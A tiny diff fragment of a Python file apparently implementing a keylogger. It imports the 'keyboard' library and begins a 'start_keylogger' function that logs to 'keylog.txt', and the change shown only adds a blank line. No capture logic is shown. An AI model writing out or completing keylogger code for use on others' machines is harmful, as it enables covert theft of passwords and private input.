@@ -1,6 +1,7 @@
 import keyboard
 
 
+
 # Function to start the keylogger
 def start_keylogger():
     log_file = "keylog.txt"
